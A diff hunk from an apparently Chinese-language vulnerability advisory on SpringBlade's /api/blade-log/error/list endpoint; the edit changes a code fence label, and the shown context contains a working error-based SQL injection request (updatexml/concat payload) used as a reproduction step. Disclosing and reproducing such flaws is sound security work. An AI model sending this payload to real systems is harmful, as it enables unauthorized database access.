@@ -47,7 +47,7 @@ SpringBlade  /api/blade-log/error/list路径存在安全漏洞，攻击者利用
 
 
 # 四、漏洞复现
-```java
+```http
 GET /api/blade-log/error/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
